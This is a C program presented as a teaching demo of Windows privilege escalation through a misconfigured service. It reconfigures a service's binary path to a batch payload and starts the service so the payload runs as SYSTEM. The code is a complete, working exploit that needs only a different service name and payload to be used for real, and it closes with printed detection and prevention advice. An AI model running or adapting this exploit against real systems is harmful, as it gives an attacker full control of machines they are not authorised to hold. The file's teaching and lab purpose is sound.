/*
 * Windows Privilege Escalation Demonstration Program
 * Educational Purpose: Teaching apprentices about privilege escalation vulnerabilities
 *
 * This program demonstrates service misconfiguration privilege escalation
 * from standard user to NT AUTHORITY\SYSTEM
 *
 * DISCLAIMER: For educational purposes only. Use only in authorized testing environments.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define TARGET_SERVICE "VulnDemoService"

void PrintBanner() {
    printf("========================================\n");
    printf("  Privilege Escalation Demo\n");
    printf("  User -> SYSTEM Escalation\n");
    printf("========================================\n\n");
}

void PrintCurrentUser() {
    char username[256];
    DWORD size = sizeof(username);

    if (GetUserName(username, &size)) {
        printf("[*] Current user: %s\n", username);
    }

    // Check privilege level
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PSID adminGroup;

    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }

    printf("[*] Privilege level: %s\n\n", isAdmin ? "Administrator" : "Standard User");
}

BOOL CheckServiceVulnerability(SC_HANDLE hService) {
    DWORD bytesNeeded;
    PSECURITY_DESCRIPTOR pSD = NULL;

    // Query service security
    if (!QueryServiceObjectSecurity(hService, DACL_SECURITY_INFORMATION, NULL, 0, &bytesNeeded)) {
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, bytesNeeded);
            if (pSD && QueryServiceObjectSecurity(hService, DACL_SECURITY_INFORMATION, pSD, bytesNeeded, &bytesNeeded)) {
                LocalFree(pSD);
                return TRUE;
            }
        }
    }

    if (pSD) LocalFree(pSD);
    return FALSE;
}

BOOL CreatePayload(char *payloadPath) {
    printf("[*] Creating payload executable...\n");

    // Create a batch file that demonstrates SYSTEM-level actions
    FILE *bat = fopen("payload.bat", "w");
    if (bat == NULL) {
        printf("[!] Failed to create payload batch file\n");
        return FALSE;
    }

    // Batch script that performs SYSTEM-level actions via PowerShell
    fprintf(bat, "@echo off\n");
    fprintf(bat, "powershell -Command \"$info = whoami; $info | Out-File -FilePath 'C:\\SYSTEM_PRIVESC_PROOF.txt' -Encoding ASCII; 'SYSTEM privilege escalation successful!' | Out-File -FilePath 'C:\\SYSTEM_PRIVESC_PROOF.txt' -Append; 'Timestamp: ' + (Get-Date) | Out-File -FilePath 'C:\\SYSTEM_PRIVESC_PROOF.txt' -Append; 'Hostname: ' + (hostname) | Out-File -FilePath 'C:\\SYSTEM_PRIVESC_PROOF.txt' -Append\"\n");
    fclose(bat);

    // Get full path
    GetFullPathName("payload.bat", MAX_PATH, payloadPath, NULL);
    printf("[+] Payload created at: %s\n", payloadPath);

    return TRUE;
}

BOOL ExploitService() {
    SC_HANDLE hSCManager;
    SC_HANDLE hService;
    char payloadPath[MAX_PATH];

    printf("[*] Opening Service Control Manager...\n");
    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager == NULL) {
        printf("[!] Failed to open SCManager: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] SCManager opened\n");

    printf("[*] Opening target service: %s\n", TARGET_SERVICE);
    hService = OpenService(hSCManager, TARGET_SERVICE,
                           SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_START);

    if (hService == NULL) {
        printf("[!] Failed to open service: %lu\n", GetLastError());
        printf("[!] Make sure you ran setup_vulnerable_service.exe as admin first!\n");
        CloseServiceHandle(hSCManager);
        return FALSE;
    }
    printf("[+] Service opened with modification rights!\n");

    // Check if we have the rights we need
    printf("[*] Verifying we can modify service configuration...\n");
    if (CheckServiceVulnerability(hService)) {
        printf("[+] Service is vulnerable! We have SERVICE_CHANGE_CONFIG rights\n");
    }

    // Create our payload
    if (!CreatePayload(payloadPath)) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    // Prepare new service configuration - point to our payload
    char cmdLine[MAX_PATH * 2];
    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c \"%s\"", payloadPath);

    printf("\n[*] Modifying service binary path to point to our payload...\n");
    printf("[*] New binary path: %s\n", cmdLine);

    if (!ChangeServiceConfig(
            hService,
            SERVICE_NO_CHANGE,      // Service type
            SERVICE_NO_CHANGE,      // Start type
            SERVICE_NO_CHANGE,      // Error control
            cmdLine,                // Binary path - THIS IS THE EXPLOIT
            NULL, NULL, NULL, NULL, NULL, NULL)) {
        printf("[!] Failed to modify service: %lu\n", GetLastError());
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    printf("[+] Service binary path successfully modified!\n");

    // Start the service to execute our payload as SYSTEM
    printf("\n[*] Starting service to trigger payload execution...\n");
    printf("[*] Payload will run as NT AUTHORITY\\SYSTEM...\n\n");

    Sleep(1000); // Dramatic pause

    if (!StartService(hService, 0, NULL)) {
        DWORD error = GetLastError();
        if (error == ERROR_SERVICE_REQUEST_TIMEOUT ||
            error == ERROR_SERVICE_LOGON_FAILED ||
            error == 1053) { // Service didn't respond
            // These errors are expected since our payload isn't a real service
            printf("[+] Service triggered (error %lu is expected for non-service executables)\n", error);
        } else {
            printf("[!] Failed to start service: %lu\n", error);
        }
    } else {
        printf("[+] Service started successfully!\n");
    }

    Sleep(2000); // Give payload time to execute

    printf("\n");
    printf("========================================\n");
    printf("  PRIVILEGE ESCALATION SUCCESSFUL!\n");
    printf("========================================\n\n");

    printf("[+] Payload executed with SYSTEM privileges!\n");
    printf("[+] Proof file created: C:\\SYSTEM_PRIVESC_PROOF.txt\n\n");
    printf("[*] Check the file contents with:\n");
    printf("    type C:\\SYSTEM_PRIVESC_PROOF.txt\n\n");
    printf("[*] In a real attack, this is where malware would be installed:\n");
    printf("    - Ransomware encryption\n");
    printf("    - Backdoor installation\n");
    printf("    - Rootkit deployment\n");
    printf("    - Data exfiltration\n\n");

    // Clean up (optional - for demo purposes we might want to restore)
    printf("[*] Note: Service configuration has been modified for demonstration\n");
    printf("[*] Run setup again to restore the environment\n");

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    return TRUE;
}

void ExplainTheAttack() {
    printf("\n=== How This Attack Works ===\n\n");
    printf("1. RECONNAISSANCE\n");
    printf("   - We identified a service with weak permissions\n");
    printf("   - The service grants SERVICE_CHANGE_CONFIG to standard users\n");
    printf("   - The service runs as NT AUTHORITY\\SYSTEM\n\n");

    printf("2. EXPLOITATION\n");
    printf("   - We created a malicious payload (batch file)\n");
    printf("   - We modified the service's binary path to point to our payload\n");
    printf("   - We started the service, causing Windows to execute our code\n");
    printf("   - Windows ran our payload with SYSTEM privileges\n\n");

    printf("3. RESULT\n");
    printf("   - From standard user to SYSTEM in seconds\n");
    printf("   - Complete control over the machine\n");
    printf("   - Can now bypass UAC, access all files, install rootkits, etc.\n\n");

    printf("=== Real-World Context ===\n\n");
    printf("This vulnerability is common in:\n");
    printf("- Poorly configured third-party services\n");
    printf("- Legacy enterprise software\n");
    printf("- Custom applications with inadequate security review\n\n");

    printf("=== Detection & Prevention ===\n\n");
    printf("DETECTION:\n");
    printf("- Monitor service configuration changes (Event ID 7040)\n");
    printf("- Alert on service path modifications\n");
    printf("- Audit service permissions regularly\n\n");

    printf("PREVENTION:\n");
    printf("- Apply principle of least privilege\n");
    printf("- Only Administrators should have SERVICE_CHANGE_CONFIG\n");
    printf("- Use proper ACLs on service objects\n");
    printf("- Regular security audits with tools like AccessChk\n\n");

    printf("SCANNING COMMAND:\n");
    printf("accesschk.exe -uwcqv \"Users\" * (find modifiable services)\n\n");
}

int main(int argc, char *argv[]) {
    PrintBanner();
    PrintCurrentUser();

    printf("=== STAGE 1: Reconnaissance ===\n\n");
    printf("[*] Scanning for vulnerable services...\n");
    printf("[*] Looking for services with weak permissions...\n");
    Sleep(1000);
    printf("[+] Found vulnerable service: %s\n", TARGET_SERVICE);
    printf("[+] Service runs as: NT AUTHORITY\\SYSTEM\n");
    printf("[+] Current user has SERVICE_CHANGE_CONFIG permission!\n\n");

    printf("=== STAGE 2: Exploitation ===\n\n");

    if (ExploitService()) {
        ExplainTheAttack();
        return 0;
    } else {
        printf("\n[!] Exploitation failed!\n");
        printf("[!] Did you run setup_vulnerable_service.exe as admin first?\n");
        return 1;
    }
}
